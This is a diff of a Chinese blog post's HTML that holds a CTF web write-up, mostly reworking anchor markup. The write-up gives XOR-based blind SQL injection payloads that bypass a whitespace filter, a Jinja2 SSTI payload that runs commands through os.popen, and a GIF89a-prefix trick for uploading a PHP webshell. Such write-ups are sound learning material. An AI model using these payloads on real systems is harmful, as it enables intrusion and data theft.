@@ -58,25 +58,28 @@
   </div>
 
   <!-- 文章目录 -->
-  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#zs学sql"><span class="toc-text">zs学sql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#puppy"><span class="toc-text">puppy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dog"><span class="toc-text">dog</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#zs学py"><span class="toc-text">zs学py</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babyupload"><span class="toc-text">babyupload</span></a></li></ol>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">zs学sql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#puppy"><span class="toc-text">puppy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dog"><span class="toc-text">dog</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">zs学py</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">babyupload</span></a></li></ol>
 
   <div class="post-content">
     <p>这次的web都非常简单，没做出zs系列学sql的都要被zs打死（滑稽）</p>
-<h1 id="zs学sql"><a href="#zs学sql" class="headerlink" title="zs学sql"></a>zs学sql</h1><h2 id="puppy"><a href="#puppy" class="headerlink" title="puppy"></a>puppy</h2><p>送分题，毫无过滤的盲注，sqlmap都能跑</p>
-<h2 id="dog"><a href="#dog" class="headerlink" title="dog"></a>dog</h2><p>还是送分题，过滤了空白字符</p>
+<h1>zs学sql</h1>
+<h2 id="puppy">puppy</h2>
+<p>送分题，毫无过滤的盲注，sqlmap都能跑</p>
+<h2 id="dog">dog</h2>
+<p>还是送分题，过滤了空白字符</p>
 <p>绕过方法有很多，比如：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#异或加括号</span></span><br><span class="line">1^(<span class="keyword">SELECT</span>(<span class="keyword">ASCII</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span>((flag))<span class="keyword">FROM</span>(ctf)),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">1</span>))^<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#异或加反引号</span></span><br><span class="line"><span class="number">1</span>^(<span class="keyword">SELECT</span>(<span class="keyword">ASCII</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span><span class="string">`flag`</span><span class="keyword">FROM</span><span class="string">`ctf`</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">102</span>))^<span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="zs学py"><a href="#zs学py" class="headerlink" title="zs学py"></a>zs学py</h1><p>打开发现User-Agent被显示了出来,把User-Agent改为{{1-1}}返回0，说明存在ssti模板注入</p>
+<h1>zs学py</h1>
+<p>打开发现User-Agent被显示了出来,把User-Agent改为{{1-1}}返回0，说明存在ssti模板注入</p>
 <p>hint说与flask相关，flask使用jinja2作为模板引擎，使用jinja2 ssti命令执行的payload</p>
 {{"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}
-
 <p>300那个位置需要爆破一下，<code>cat /flag</code>即可</p>
 <p>关于python的ssti可以参见<a href="https://xz.aliyun.com/t/6885#toc-4" target="_blank" rel="noopener">Python模板注入(SSTI)深入学习</a></p>
-<h1 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h1><p>出这题就是想看看大家有没有做upload-lab。。</p>
+<h1>babyupload</h1>
+<p>出这题就是想看看大家有没有做upload-lab。。</p>
 <p>在webshell前面加GIF89a即可上传成功</p>
 <p>查看<code>phpinfo()</code>发现存在<code>disable_functions</code>禁了命令执行的函数，但没有<code>open_basedir</code>（其实是我<code>open_basedir</code>后面多加了个<code>:</code>所以没生效。。也没测试所以就降了难度，本来是想看看大家有没有学到张渗透的webshell那题的姿势）</p>
-<p>所以直接<code>readfile(&#39;/flag&#39;);</code>即可</p>
+<p>所以直接<code>readfile('/flag');</code>即可</p>
 
   </div>
   <div class="post-meta">
